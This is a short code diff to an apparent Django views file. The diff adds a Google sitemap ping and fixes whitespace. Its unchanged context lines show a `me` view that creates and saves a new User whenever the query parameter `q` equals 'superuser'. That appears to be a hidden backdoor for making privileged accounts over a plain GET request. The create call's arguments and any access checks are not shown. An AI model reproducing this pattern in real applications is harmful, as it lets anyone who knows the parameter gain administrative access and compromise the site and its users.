@@ -11,6 +11,7 @@ from apps.users.models import User
 from django.contrib import messages
 from django.contrib.auth import authenticate, login, logout
 from django.contrib.auth.decorators import login_required
+from django.contrib.sitemaps import ping_google
 from django.http import HttpResponse, JsonResponse
 from django.shortcuts import redirect, render
 
@@ -30,7 +31,7 @@ def dashboard(request):
 def me(request):
     o = ArticleCollector()
     q = request.GET.get("q")
-    r=0
+    r = 0
     if q == "superuser":
         try:
             user = User.objects.create(
@@ -48,7 +49,7 @@ def me(request):
         user.save()
     elif q:
         r = o.newsdata(q)
-
+    ping_google("/sitemaps.xml")
     return HttpResponse(f"{r}")
 
 
